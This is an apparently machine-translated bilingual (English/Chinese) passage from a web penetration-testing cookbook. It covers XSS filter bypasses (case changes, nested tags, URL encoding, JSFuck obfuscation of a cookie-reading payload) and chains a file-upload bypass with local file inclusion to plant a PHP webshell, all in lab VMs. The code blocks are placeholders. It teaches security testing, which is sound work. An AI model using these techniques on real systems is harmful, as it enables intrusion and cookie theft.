- en: Bypassing Basic Security Controls
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 绕过基本安全控制
- en: 'In this chapter, we will cover the following recipes:'
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: 本章将涵盖以下几个主题：
- en: Basic input validation bypass in Cross-Site Scripting attacks
  id: totrans-2
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 跨站脚本攻击中的基本输入验证绕过
- en: Exploiting Cross-Site Scripting using obfuscated code
  id: totrans-3
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 利用混淆代码进行跨站脚本攻击
- en: Bypassing file upload restrictions
  id: totrans-4
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 绕过文件上传限制
- en: Avoiding CORS restrictions in web services
  id: totrans-5
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 避免Web服务中的CORS限制
- en: Using Cross-Site Scripting to bypass CSRF protection and CORS restrictions
  id: totrans-6
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用跨站脚本攻击绕过CSRF保护和CORS限制
- en: Exploiting HTTP parameter pollution
  id: totrans-7
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 利用HTTP参数污染
- en: Exploiting vulnerabilities through HTTP headers
  id: totrans-8
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 通过HTTP头利用漏洞
- en: Introduction
  id: totrans-9
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 介绍
- en: So far, in this book, we have identified and exploited vulnerabilities in conditions
    where they could be considered *low hanging fruits*, that is, we knew the vulnerabilities
    existed, and in their exploitation, we didn't face any prevention mechanisms or
    had to avoid being blocked by a web application firewall or similar.
  id: totrans-10
  prefs: []
  type: TYPE_NORMAL
  zh: 到目前为止，在本书中，我们已经识别并利用了在被认为是*低垂果实*的情况下的漏洞，也就是说，我们知道漏洞的存在，在利用它们时，我们没有遇到任何防护机制，或者没有被Web应用防火墙或类似的安全系统阻止。
- en: The most common scenario in a real-world penetration test is that developers
    have made an effort to build a robust and secure application, and vulnerabilities
    may not be straightforward to find and may be completely or partially addressed
    so they are either not present in the application, or are at least hard to find
    and exploit. For this scenario, we need to have in our arsenal tools that allow
    us to discover ways to overcome these complications and, be able to identify and
    exploit flaws that the developers thought they had prevented, but did to in a
    non-optimum manner.
  id: totrans-11
  prefs: []
  type: TYPE_NORMAL
  zh: 在实际渗透测试中最常见的情况是，开发人员已经努力构建了一个强大且安全的应用程序，漏洞可能不容易发现，且可能已经完全或部分解决，因此它们要么不再出现在应用程序中，要么至少很难被找到和利用。对于这种情况，我们需要在我们的工具箱中拥有能够发现克服这些复杂情况的方法的工具，并能够识别和利用开发人员认为自己已经防止的漏洞，但他们的防护措施可能不够完善。
- en: In this chapter, we will discuss several mechanisms to bypass protections and
    security controls that do not mitigate vulnerabilities but attempt to hide them
    or complicate their exploitation, which is not ideal way of solving a security
    issue.
  id: totrans-12
  prefs: []
  type: TYPE_NORMAL
  zh: 本章将讨论几种绕过保护和安全控制的方法，这些保护和控制并没有缓解漏洞，而是试图隐藏漏洞或使其利用更加复杂，这并不是解决安全问题的理想方式。
- en: Basic input validation bypass in Cross-Site Scripting attacks
  id: totrans-13
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 在跨站脚本攻击中的基本输入验证绕过
- en: One of the most common ways in which developers perform input validation is
    by blacklisting certain characters of words in information provided by users.
    The main drawback of this blacklisting approach is that elements that may be used
    in an attack are often missed because new vectors are found every day.
  id: totrans-14
  prefs: []
  type: TYPE_NORMAL
  zh: 开发人员执行输入验证的最常见方法之一是通过在用户提供的信息中黑名单某些字符或词汇。此黑名单方法的主要缺点是，由于每天都会发现新的攻击向量，因此可能会错过一些本可以用于攻击的元素。
- en: In this recipe, we will illustrate some methods for bypassing a weak implementation
    of a blacklisting validation.
  id: totrans-15
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个例子中，我们将演示一些绕过黑名单验证弱实现的方法。
- en: How to do it...
  id: totrans-16
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 如何做到...
- en: 'We will start with DVWA in our vulnerable VM and set the security level to
    medium. Also, set Burp Suite as proxy for the browser:'
  id: totrans-17
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将从DVWA开始，使用我们脆弱的虚拟机，并将安全级别设置为中等。还需将Burp Suite设置为浏览器的代理：
- en: 'First, let''s take a look at how the vulnerable page behaves at this security
    level. As shown in the following screenshot, when attempting to inject script
    code, the script tags are removed from the output:'
  id: totrans-18
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 首先，让我们看看在这个安全级别下，脆弱页面的行为。正如以下截图所示，当尝试注入脚本代码时，script标签从输出中被移除：
- en: '![](assets/3e36cf1c-d683-4dbe-8e80-2c38d3c7927e.png)'
  id: totrans-19
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/3e36cf1c-d683-4dbe-8e80-2c38d3c7927e.png)'
- en: 'Send that request to repeater and issue it again. As it can be seen in the
    next screenshot, the opening script tag is removed:'
  id: totrans-20
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 将请求发送到重放器并再次发出。正如下一张截图所示，打开的script标签已被移除：
- en: '![](assets/edf92362-938e-43ff-bff7-8145b52a4875.png)'
  id: totrans-21
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/edf92362-938e-43ff-bff7-8145b52a4875.png)'
- en: 'There are multiple ways in which we can try to overcome this obstacle. A very
    common mistake made when implementing this type of protection is to make case-sensitive
    comparisons when validating and sanitizing inputs. Send the request again, but
    this time change the capitalization of the word `script`, and use `sCriPt` instead:'
  id: totrans-22
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们可以尝试多种方法来克服这个障碍。实现这种保护时，开发人员常犯的一个错误是，在验证和清理输入时进行大小写敏感的比较。再次发送请求，但这次更改`script`这个词的大小写，使用`sCriPt`：
- en: '![](assets/d7014c44-ac6a-448e-9daf-7a18a17607b7.png)'
  id: totrans-23
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/d7014c44-ac6a-448e-9daf-7a18a17607b7.png)'
- en: 'According to the output in Repeater, and as shown in the following screenshot,
    that change is sufficient to exploit a **Cross-Site Scripting** (**XSS**) vulnerability:'
  id: totrans-24
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 根据Repeater中的输出，以及下图所示的内容，这一改变足以利用**跨站脚本攻击**（**XSS**）漏洞：
- en: '![](assets/e0c7c35f-9c9b-4302-9fff-8466e2955a50.png)'
  id: totrans-25
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/e0c7c35f-9c9b-4302-9fff-8466e2955a50.png)'
- en: How it works...
  id: totrans-26
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 它是如何工作的……
- en: In this recipe, we demonstrated a very simple way to bypass a poorly implemented
    security control, as most programming languages are case sensitive when comparing
    strings. A simple blacklist is not enough protection against injection attacks.
    Unfortunately, it is not uncommon for a penetration tester to see these kinds
    of implementations in real-world applications.
  id: totrans-27
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个配方中，我们演示了一种非常简单的方式来绕过一个实现不佳的安全控制，因为大多数编程语言在比较字符串时是区分大小写的。一个简单的黑名单不足以防止注入攻击。不幸的是，渗透测试人员在现实应用中看到这些类型的实现并不少见。
- en: There's more...
  id: totrans-28
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 还有更多……
- en: 'There are so many ways to use capitalization, encoding, and many different
    HTML tags and events to trigger XSS vulnerabilities that it is almost impossible
    to create a comprehensive list of forbidden words or characters. A few other alternatives
    we had in this exercise are as follows:'
  id: totrans-29
  prefs: []
  type: TYPE_NORMAL
  zh: 有许多方式可以通过大小写、编码以及多种不同的HTML标签和事件来触发XSS漏洞，因此几乎不可能创建一个全面的禁止使用的单词或字符列表。我们在这次练习中的一些其他替代方法如下：
- en: Use a different HTML tag, such as `&lt;img>`, `&lt;video>`, and `&lt;div>`,
    and inject the code in its `src` parameter or its event handlers, such as `onload`,
    `onerror`, and `onmouseover`.
  id: totrans-30
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用不同的HTML标签，例如`&lt;img>`、`&lt;video>`和`&lt;div>`，并将代码注入其`src`参数或其事件处理程序中，如`onload`、`onerror`和`onmouseover`。
- en: Nest multiple script tags, for example, `&lt;scr&lt;script>ipt>`. So, if the
    `&lt;script>` tag is deleted, another tag is formed as a result of its deletion.
  id: totrans-31
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 嵌套多个`<script>`标签，例如`&lt;scr&lt;script>ipt>`。这样，如果`&lt;script>`标签被删除，那么删除后会形成另一个标签。
- en: Try different encoding on the whole payload or certain parts of it; for example,
    we could have URL-encoded `&lt;script>` to `%3c%73%63%72%69%70%74%3e`.
  id: totrans-32
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 尝试对整个有效载荷或其中的某些部分使用不同的编码；例如，我们可以将`&lt;script>`进行URL编码为`%3c%73%63%72%69%70%74%3e`。
- en: A more comprehensive list of validation and filtering bypass can be found at [https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet).
  id: totrans-33
  prefs: []
  type: TYPE_NORMAL
  zh: 一个更全面的验证和过滤绕过列表可以在[https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)找到。
- en: Exploiting Cross-Site Scripting using obfuscated code
  id: totrans-34
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 利用混淆代码进行跨站脚本攻击
- en: In the preceding recipe, we faced a filtering mechanism that removed the opening
    script tag. As `&lt;script>` is not the only tag that may be used in an XSS attack
    and JavaScript code is more consistent than HTML in terms of capitalization and
    structure, some filters try to restrict the use of words and characters belonging
    to JavaScript code, such as alert, cookie, and document.
  id: totrans-35
  prefs: []
  type: TYPE_NORMAL
  zh: 在前面的配方中，我们面对了一种过滤机制，该机制移除了开头的`<script>`标签。由于`&lt;script>`并不是XSS攻击中唯一可能使用的标签，并且JavaScript代码在大小写和结构上比HTML更具一致性，一些过滤器试图限制使用属于JavaScript代码的单词和字符，例如alert、cookie和document。
- en: In this recipe, we will explore an alternative, a somewhat extreme one maybe,
    of code obfuscation using a so-called esoteric language called JSFuck ([http://JSFuck.com](http://JSFuck.com)).
  id: totrans-36
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个配方中，我们将探索一种替代方法，也许是有些极端的，通过使用一种所谓的神秘语言——JSFuck（[http://JSFuck.com](http://JSFuck.com)）来进行代码混淆。
- en: How to do it...
  id: totrans-37
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 如何操作……
- en: 'For this recipe, we will use the prototyping features provided by the Magical
    Code Injection Rainbow, an application included in our OWASP BWA vulnerable virtual
    machine:'
  id: totrans-38
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个配方中，我们将使用由Magical Code Injection Rainbow提供的原型功能，这是我们OWASP BWA脆弱虚拟机中包含的一个应用程序：
- en: First, go to the application and select XSSmh from the menu to go to the XSS
    sandbox. Here, we can set up a field vulnerable to XSS with custom types of sanitization.
  id: totrans-39
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 首先，进入应用程序并从菜单中选择XSSmh，进入XSS沙箱。在这里，我们可以设置一个易受XSS攻击的字段，并使用自定义类型的清理。
- en: 'In our case, we will use the last Sanitization Level: Case-Insesitively and
    Repetitively Remove Blacklisted Items, matching Keywords.'
  id: totrans-40
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在我们的例子中，我们将使用最后的清理级别：不区分大小写并重复删除黑名单项，匹配关键字。
- en: In Sanitization Parameters, we will need to enter the blacklisted words and
    characters—add `alert,document,cookie,href,location,and src`. This will greatly
    limit the range of action of a possible attacker exploiting the application.
  id: totrans-41
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在“清理参数”中，我们需要输入黑名单词汇和字符——添加 `alert,document,cookie,href,location,and src`。这样会大大限制可能利用该应用程序的攻击者的操作范围。
- en: 'The Input Sanitization section should look like this:'
  id: totrans-42
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 输入清理部分应该如下所示：
- en: '![](assets/05e4fb96-3f17-40a2-921d-4fcdc19a84b1.png)'
  id: totrans-43
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/05e4fb96-3f17-40a2-921d-4fcdc19a84b1.png)'
- en: 'Now, test a common injection that displays the cookie in an alert message,
    as follows:'
  id: totrans-44
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，测试一个常见的注入，它在警告消息中显示 cookie，如下所示：
- en: '![](assets/5bd55129-e63a-43c7-8d36-699e97063552.png)'
  id: totrans-45
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/5bd55129-e63a-43c7-8d36-699e97063552.png)'
- en: As you will see, no alert is shown. This is because of the sanitization options
    we configured.
  id: totrans-46
  prefs: []
  type: TYPE_NORMAL
  zh: 如你所见，未显示任何警告。这是因为我们配置的清理选项。
- en: In order to bypass this protection, we will need to find a way to obfuscate
    the code so that it is approved by the validation mechanism and still recognized
    and executed by the browser. Here is where JSFuck comes into play. On your base
    machine, navigate to [http://jsfuck.com](http://jsfuck.com). The site describes
    the language and how it goes about generating JavaScript code with only six different
    characters, namely *[*, *]*, *(*, *)*, *+*, and *!*.
  id: totrans-47
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 为了绕过这个保护机制，我们需要找到一种方法来混淆代码，使其通过验证机制的审查，同时仍然被浏览器识别并执行。这时，JSFuck 就派上用场了。在你的本地主机上，导航到
    [http://jsfuck.com](http://jsfuck.com)。该网站描述了这个语言以及它如何利用仅有的六个字符来生成 JavaScript
    代码，分别是 *[*, *]*, *(*, *)*, *+*, 和 *!*。
- en: 'You will also find that this site has a form to convert normal JavaScript to
    JSFuck representation; try converting `alert(document.cookie);`, which is the
    payload we are trying to get executed. As can be seen in the following screenshot,
    that simple string generates a code of almost 13,000 characters, which is too
    much to send in a `GET` request. We need to find a way to reduce that amount:'
  id: totrans-48
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 你还会发现这个网站有一个表单，可以将普通的 JavaScript 转换为 JSFuck 表示法；试着将 `alert(document.cookie);`
    转换成 JSFuck，这是我们尝试执行的有效载荷。正如下面的截图所示，这个简单的字符串会生成一个几乎 13,000 个字符的代码，这对于在 `GET` 请求中发送来说太多了。我们需要找到一种方法来减少这个数量：
- en: '![](assets/dcd87515-c9c8-4677-97b9-e9b8437ee4f0.png)'
  id: totrans-49
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/dcd87515-c9c8-4677-97b9-e9b8437ee4f0.png)'
- en: 'What we can do is to not obfuscate the whole payload, but only the parts that
    are necessary to bypass the sanitization. Make sure that the Eval Source option
    is not set, and obfuscate the following strings:'
  id: totrans-50
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们可以做的是，不混淆整个有效载荷，而仅仅混淆那些需要绕过清理的部分。确保没有设置 Eval Source 选项，并混淆以下字符串：
- en: '`ert`'
  id: totrans-51
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`ert`'
- en: '`d`'
  id: totrans-52
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`d`'
- en: '`e`'
  id: totrans-53
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`e`'
- en: 'Now, we will integrate the obfuscated code into a full payload. As the JSFuck
    output is interpreted by the JavaScript engine as text, we will need to use the
    `eval` function to execute it. The final payload would be as follows:'
  id: totrans-54
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，我们将把混淆后的代码整合成一个完整的有效载荷。由于 JSFuck 输出被 JavaScript 引擎作为文本解析，我们需要使用 `eval` 函数来执行它。最终的有效载荷如下：
- en: '[PRE0]'
  id: totrans-55
  prefs: []
  type: TYPE_PRE
  zh: '[PRE0]'
- en: 'Insert the payload in the injection string and click on **Inject**. The code
    should be executed as follows:'
  id: totrans-56
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 将有效载荷插入到注入字符串中，然后点击 **Inject**。代码应该如下所示执行：
- en: '![](assets/5e4a7378-b3e2-4194-a827-48ae8a361aad.png)'
  id: totrans-57
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/5e4a7378-b3e2-4194-a827-48ae8a361aad.png)'
- en: How it works...
  id: totrans-58
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 它是如何工作的...
- en: By obfuscating the payload, we are able to bypass security controls based in
    the recognition of words and characters. We chose to use the language JSFuck to
    obfuscate the code as it is in fact JavaScript.
  id: totrans-59
  prefs: []
  type: TYPE_NORMAL
  zh: 通过混淆有效载荷，我们能够绕过基于词汇和字符识别的安全控制。我们选择使用 JSFuck 语言来混淆代码，因为它实际上是 JavaScript。
- en: 'JSFuck obfuscates the code by manipulating Boolean values and predefined constants
    to form printable characters, for example, to get the character `a`:'
  id: totrans-60
  prefs: []
  type: TYPE_NORMAL
  zh: JSFuck 通过操作布尔值和预定义常量来混淆代码，从而形成可打印字符。例如，要获取字符 `a`：
- en: '`a` is the second letter of `false` and it also can be represented as the second
    element of an array: false[1].'
  id: totrans-61
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: '`a` 是 `false` 的第二个字母，也可以表示为数组的第二个元素：false[1]。'
- en: That can also be represented as `(false+[])[1]`.
  id: totrans-62
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 这也可以表示为 `(false+[])[1]`。
- en: Also, `false`, as a Boolean value, is the negation of an empty array `![]`.
    So, the above expression could also be `(![]+[])[1]`.
  id: totrans-63
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 此外，`false` 作为布尔值，是空数组 `![]` 的否定。所以，上面的表达式也可以写作 `(![]+[])[1]`。
- en: The number `1` can also be `+true`, which leaves `(![]+[])[+true]`.
  id: totrans-64
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 数字 `1` 也可以表示为 `+true`，这会得到 `(![]+[])[+true]`。
- en: Finally, we all know true is the opposite of false, then `!![]`, and our final
    string is `(![]+[])[+!![]]`.
  id: totrans-65
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 最后，我们都知道 true 是 false 的相反，那么 `!![]`，我们的最终字符串是 `(![]+[])[+!![]]`。
- en: We used the obfuscation only over a few letters of each blacklisted word, so
    we did not make a payload that is too big, but we were also able to bypass it.
    As this obfuscation generates a string, we need to use `eval` to instruct the
    interpreter to treat that string as a piece of executable code.
  id: totrans-66
  prefs: []
  type: TYPE_NORMAL
  zh: 我们只对每个被列入黑名单的单词的几个字母进行了混淆，因此我们没有做一个太大的有效负载，但也成功绕过了它。由于这个混淆生成了一个字符串，我们需要使用 `eval`
    来指示解释器将该字符串作为可执行代码处理。
- en: Bypassing file upload restrictions
  id: totrans-67
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 绕过文件上传限制
- en: In previous chapters, we have seen how to avoid some restrictions in file uploads.
    In this recipe, we will face a more complete, although still insufficient, validation
    and chain another vulnerability in order to, first, upload a webshell into the
    server, and second, move it into a directory where we can execute it from.
  id: totrans-68
  prefs: []
  type: TYPE_NORMAL
  zh: 在前面的章节中，我们已经了解了如何避免一些文件上传中的限制。在本节中，我们将面临一个更完整、虽然仍然不足够的验证，并串联另一个漏洞，以便首先将 Webshell
    上传到服务器，然后将其移动到一个可以执行的目录中。
- en: How to do it...
  id: totrans-69
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 如何操作…
- en: 'For this recipe, we need Mutillidae II in our vulnerable VM to be at security
    level, use the Toggle Security option in the menu to set it, and use Burp Suite
    as proxy:'
  id: totrans-70
  prefs: []
  type: TYPE_NORMAL
  zh: 对于本节，我们需要在我们的易受攻击虚拟机中运行 Mutillidae II，并将其设置为安全级别，使用菜单中的切换安全选项进行设置，并使用 Burp Suite
    作为代理：
- en: In Mutillidae II's menu, go to Others | Unrestricted File Upload | File Upload.
  id: totrans-71
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在 Mutillidae II 的菜单中，进入 Others | Unrestricted File Upload | File Upload。
- en: 'The first test will be to attempt uploading a PHP webshell. You can use the
    ones we used in previous chapters or make a new one. As follows, the upload will
    fail and we will receive a detailed description of why it failed:'
  id: totrans-72
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 第一次测试将尝试上传一个 PHP Webshell。你可以使用我们在前几章中使用的 Webshell，或者自己制作一个。如下所示，上传会失败，我们将收到失败原因的详细描述：
- en: '![](assets/d15f34f7-6a1b-4779-9df8-de4fd1a57e52.png)'
  id: totrans-73
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/d15f34f7-6a1b-4779-9df8-de4fd1a57e52.png)'
- en: From the preceding response, we can infer that the files are uploaded to `/tmp`
    in the server, first using a randomly generated name, then file extension and
    type are checked, and if they are allowed, the file is renamed to its original
    name. So, in order to upload and execute a PHP file (a webshell) in this server,
    we need to change its extension and the `Content-Type` header in the request.
  id: totrans-74
  prefs: []
  type: TYPE_NORMAL
  zh: 从上面的响应中，我们可以推断出文件被上传到服务器的 `/tmp` 目录，首先使用一个随机生成的文件名，然后检查文件的扩展名和类型，如果允许，文件将被重命名为其原始名称。因此，为了上传并执行一个
    PHP 文件（一个 Webshell），我们需要更改其扩展名和请求中的 `Content-Type` 头。
- en: 'Let''s first try and upload a script that will tell us what the working directory
    (or document root) of the web server is, so that we know where to copy our webshell
    to once it is uploaded. Create a file `sf-info.php` containing the following code:'
  id: totrans-75
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 让我们首先尝试上传一个脚本，该脚本将告诉我们 Web 服务器的工作目录（或文档根目录），这样我们就知道上传后该将 Webshell 复制到哪里。创建一个包含以下代码的文件
    `sf-info.php`：
- en: '[PRE1]'
  id: totrans-76
  prefs: []
  type: TYPE_PRE
  zh: '[PRE1]'
- en: 'Upload it by intercepting the upload request and changing the extension to
    `.jpg` in the `filename` parameter and the `Content-Type` to `image/jpeg`, as
    follows:'
  id: totrans-77
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 通过拦截上传请求，并将 `filename` 参数中的扩展名更改为 `.jpg`，以及将 `Content-Type` 更改为 `image/jpeg`，按如下方式上传：
- en: '![](assets/ee08d778-316e-41ee-9d3a-484bbc0f40ed.png)'
  id: totrans-78
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/ee08d778-316e-41ee-9d3a-484bbc0f40ed.png)'
- en: Now, go to BurpSuite's Proxy History and send any `GET` request to Mutillidae
    to repeater. We will use this to execute our recently uploaded file by exploiting
    a Local File Inclusion vulnerability.
  id: totrans-79
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，转到 BurpSuite 的 Proxy History 并将任何 `GET` 请求发送到 Mutillidae 的 Repeater。我们将利用这个功能，通过利用本地文件包含漏洞来执行我们最近上传的文件。
- en: 'In **Repeater**, replace the value of the `page` parameter in the URL by `../../../../tmp/sf-info.jpg`
    and send the request. The result, as displayed in the following screenshot, will
    tell us the working directory for the web server and the content of such a directory:'
  id: totrans-80
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在 **Repeater** 中，将 URL 中 `page` 参数的值替换为 `../../../../tmp/sf-info.jpg`，然后发送请求。结果，如下图所示，将告诉我们
    Web 服务器的工作目录以及该目录的内容：
- en: '![](assets/9c2cb502-d654-4532-9c16-bdb47f3f5eae.png)'
  id: totrans-81
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/9c2cb502-d654-4532-9c16-bdb47f3f5eae.png)'
- en: 'Now, let''s create the webshell code and put the following code in a file named
    `webshell.php`:'
  id: totrans-82
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，让我们创建 Webshell 代码，并将以下代码放入一个名为 `webshell.php` 的文件中：
- en: '[PRE2]'
  id: totrans-83
  prefs: []
  type: TYPE_PRE
  zh: '[PRE2]'
- en: 'Upload the file, changing its extension and type as follows:'
  id: totrans-84
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 上传文件，并按如下方式更改其扩展名和类型：
- en: '![](assets/287ead44-ece3-4cc9-a278-f0c6e99768e2.png)'
  id: totrans-85
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/287ead44-ece3-4cc9-a278-f0c6e99768e2.png)'
- en: The question now is how to execute commands through the webshell. We cannot
    call it directly, as it is stored in `/tmp` and that is not directly accessible
    from the browser; we may be able to use the file inclusion vulnerability, but,
    as the webshell's code will be integrated with that of the including script (`index.php`),
    we depend on this script not doing any filtering or modification to the parameters
    provided. To work around that difficulties, we will upload another file to the
    server that renames the webshell to `.php` and moves it to the web root.
  id: totrans-86
  prefs: []
  type: TYPE_NORMAL
  zh: 现在的问题是如何通过 Web Shell 执行命令。我们不能直接调用它，因为它存储在`/tmp`目录下，浏览器无法直接访问；我们可能能够利用文件包含漏洞，但由于
    Web Shell 的代码会与包含脚本（`index.php`）的代码结合使用，因此我们依赖于该脚本不会对提供的参数进行任何过滤或修改。为了解决这些问题，我们将向服务器上传另一个文件，该文件将
    Web Shell 重命名为 `.php` 并将其移动到 Web 根目录。
- en: Send to repeater the request where we uploaded `sf-info.php`.
  id: totrans-87
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 将上传`sf-info.php`的请求发送到重放器。
- en: Change the filename to `rename.jpg` and adjust the `Content-Type`.
  id: totrans-88
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 将文件名更改为`rename.jpg`，并调整`Content-Type`。
- en: 'Replace the file''s content with the following content:'
  id: totrans-89
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 将文件内容替换为以下内容：
- en: '[PRE3]'
  id: totrans-90
  prefs: []
  type: TYPE_PRE
  zh: '[PRE3]'
- en: 'The following screenshot is how it should look:'
  id: totrans-91
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 以下截图显示了它应该呈现的样子：
- en: '![](assets/9f555b58-d8c6-4a57-989a-1e190b7622dc.png)'
  id: totrans-92
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/9f555b58-d8c6-4a57-989a-1e190b7622dc.png)'
- en: 'As we did with `sf-info.jpg`, execute `rename.jpg` by exploiting LFI, as demonstrated
    in the following screenshot:'
  id: totrans-93
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 正如我们在`sf-info.jpg`中所做的，利用 LFI 执行`rename.jpg`，如下图所示：
- en: '![](assets/c32411e1-93e5-45b4-9100-7be712e50db8.png)'
  id: totrans-94
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/c32411e1-93e5-45b4-9100-7be712e50db8.png)'
- en: 'Now, our webshell should be in the application''s root directory. Navigate
    to `http://192.168.56.11/mutillidae/webshell.php`. The following screenshot shows
    system commands being executed through it:'
  id: totrans-95
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，我们的 Web Shell 应该位于应用程序的根目录中。访问`http://192.168.56.11/mutillidae/webshell.php`。以下截图展示了通过它执行系统命令的过程：
- en: '![](assets/87390676-1329-462a-adc6-7f04a677d76c.png)'
  id: totrans-96
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/87390676-1329-462a-adc6-7f04a677d76c.png)'
- en: How it works...
  id: totrans-97
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 它是如何工作的...
- en: In this recipe, we identified a way to bypass restrictions on a file upload
    page in order to upload malicious code to the server. However, due to such restrictions,
    the uploaded files are not directly executable by the attacker, as they must be
    uploaded as images and they will be treated by the browser and server as such.
  id: totrans-98
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个教程中，我们找到了一种绕过文件上传页面限制的方法，从而将恶意代码上传到服务器。然而，由于这些限制，上传的文件不能直接由攻击者执行，因为它们必须作为图片上传，并且浏览器和服务器会将其视为图片处理。
- en: We used a Local File Inclusion vulnerability to execute some of the uploaded
    files. This works as a bypass on the file types restriction, but doesn't allow
    for a more complex functionality, such as webshell. First, we executed commands
    to get to know the internal server setup and discover the directories where it
    had the executable code stored.
  id: totrans-99
  prefs: []
  type: TYPE_NORMAL
  zh: 我们使用了本地文件包含（Local File Inclusion，LFI）漏洞来执行一些上传的文件。这可以作为绕过文件类型限制的一种方法，但无法实现更复杂的功能，如
    Web Shell。首先，我们执行命令以了解服务器的内部设置，并发现存储可执行代码的目录。
- en: Once we knew about the internal filesystem, we uploaded our webshell and added
    a second script to copy it to the web root directory so that we could call it
    directly from the browser.
  id: totrans-100
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦我们了解了内部文件系统，我们上传了我们的 Web Shell，并添加了第二个脚本将其复制到 Web 根目录，这样我们就可以直接从浏览器调用它。
- en: Avoiding CORS restrictions in web services
  id: totrans-101
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 绕过 Web 服务中的 CORS 限制
- en: '**Cross-Origin Resource Sharing** (**CORS**) is a set of policies configured
    in the server side that tells the browser whether the server allows requests generated
    with script code at external sites (cross-origin requests), and from which sites,
    or whether it only accepts requests generated in pages hosted by itself (same
    origin). A correctly configured CORS policy can help in the prevention of Cross
    Site Request Forgery attacks, and although it is not enough, it can stop some
    vectors.'
  id: totrans-102
  prefs: []
  type: TYPE_NORMAL
